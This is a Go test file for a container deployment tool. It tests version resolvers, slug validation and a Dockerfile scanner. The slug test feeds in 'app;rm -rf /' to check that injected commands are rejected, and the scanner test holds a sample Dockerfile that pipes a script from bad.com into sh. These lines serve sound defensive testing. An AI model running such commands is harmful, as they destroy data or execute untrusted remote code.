package http

import (
	"os"
	"path/filepath"
	"testing"
)

func TestRuntimeVersionResolver(t *testing.T) {
	// Test user-specified versions
	nodeUser := resolveRuntimeVersion("node", "", "18")
	if nodeUser.Version != "18" || nodeUser.FullImage != "node:18-alpine" || nodeUser.Source != "user" {
		t.Errorf("expected node 18 user version, got %+v", nodeUser)
	}

	pyUser := resolveRuntimeVersion("python", "", "3.11")
	if pyUser.Version != "3.11" || pyUser.FullImage != "python:3.11-slim" || pyUser.Source != "user" {
		t.Errorf("expected python 3.11 user version, got %+v", pyUser)
	}

	// Test default fallbacks
	nodeDefault := resolveRuntimeVersion("node", "", "")
	if nodeDefault.Version != "20" || nodeDefault.FullImage != "node:20-alpine" || nodeDefault.Source != "default" {
		t.Errorf("expected node 20 default, got %+v", nodeDefault)
	}

	goDefault := resolveRuntimeVersion("go", "", "")
	if goDefault.Version != "1.23" || goDefault.FullImage != "golang:1.23-alpine" {
		t.Errorf("expected go 1.23 default, got %+v", goDefault)
	}

	// Test auto-detection from mock project directory
	tmpDir := t.TempDir()
	_ = os.WriteFile(filepath.Join(tmpDir, ".node-version"), []byte("22.1.0\n"), 0644)

	nodeAuto := resolveRuntimeVersion("node", tmpDir, "")
	if nodeAuto.Version != "22" || nodeAuto.FullImage != "node:22-alpine" || nodeAuto.Source != "project-file" {
		t.Errorf("expected node 22 auto-detected from .node-version, got %+v", nodeAuto)
	}

	// Test Python auto-detection
	pyDir := t.TempDir()
	_ = os.WriteFile(filepath.Join(pyDir, "runtime.txt"), []byte("python-3.10.12\n"), 0644)

	pyAuto := resolveRuntimeVersion("python", pyDir, "")
	if pyAuto.Version != "3.10" || pyAuto.FullImage != "python:3.10-slim" || pyAuto.Source != "project-file" {
		t.Errorf("expected python 3.10 auto-detected from runtime.txt, got %+v", pyAuto)
	}

	// Test Go auto-detection
	goDir := t.TempDir()
	_ = os.WriteFile(filepath.Join(goDir, "go.mod"), []byte("module myapp\n\ngo 1.22.4\n"), 0644)

	goAuto := resolveRuntimeVersion("go", goDir, "")
	if goAuto.Version != "1.22" || goAuto.FullImage != "golang:1.22-alpine" || goAuto.Source != "project-file" {
		t.Errorf("expected go 1.22 auto-detected from go.mod, got %+v", goAuto)
	}
}

func TestDatabaseVersionResolver(t *testing.T) {
	tests := []struct {
		engine      string
		version     string
		expectedTag string
		expectedVer string
	}{
		{"postgres", "", "postgres:16-alpine", "16"},
		{"postgres", "15", "postgres:15-alpine", "15"},
		{"mysql", "", "mysql:8.0", "8.0"},
		{"mysql", "8.4", "mysql:8.4", "8.4"},
		{"redis", "", "redis:7.2-alpine", "7.2"},
		{"redis", "7.4", "redis:7.4-alpine", "7.4"},
		{"mongodb", "", "mongo:7.0", "7.0"},
		{"mongodb", "6.0", "mongo:6.0", "6.0"},
		{"clickhouse", "", "clickhouse/clickhouse-server:24.3-alpine", "24.3"},
	}

	for _, tt := range tests {
		tag, ver := resolveDatabaseVersion(tt.engine, tt.version)
		if tag != tt.expectedTag || ver != tt.expectedVer {
			t.Errorf("resolveDatabaseVersion(%q, %q) = (%q, %q), want (%q, %q)",
				tt.engine, tt.version, tag, ver, tt.expectedTag, tt.expectedVer)
		}
	}
}

func TestSlugValidator(t *testing.T) {
	valid := []string{"my-app", "api", "web-backend-1", "service123", "a"}
	for _, s := range valid {
		if err := ValidateSlug(s); err != nil {
			t.Errorf("expected valid slug %q, got error: %v", s, err)
		}
	}

	invalid := []string{"", "My-App", "app_name", "app;rm -rf /", "--bad", "docker", "root", "localhost"}
	for _, s := range invalid {
		if err := ValidateSlug(s); err == nil {
			t.Errorf("expected invalid slug for %q, got nil error", s)
		}
	}
}

func TestDockerfileSecurityScanner(t *testing.T) {
	dangerous := `FROM ubuntu:latest
RUN curl -sSL https://bad.com/install.sh | sh
CMD ["--privileged"]`

	warnings, errors := ScanDockerfileForDangers(dangerous)
	if len(warnings) == 0 && len(errors) == 0 {
		t.Errorf("expected security scanner to detect dangerous patterns in dockerfile")
	}

	safe := `FROM node:20-alpine
WORKDIR /app
COPY . .
RUN npm ci
USER 1001
CMD ["npm", "start"]`

	safeWarns, safeErrs := ScanDockerfileForDangers(safe)
	if len(safeWarns) != 0 || len(safeErrs) != 0 {
		t.Errorf("expected clean dockerfile to have 0 warnings/errors, got %v / %v", safeWarns, safeErrs)
	}
}
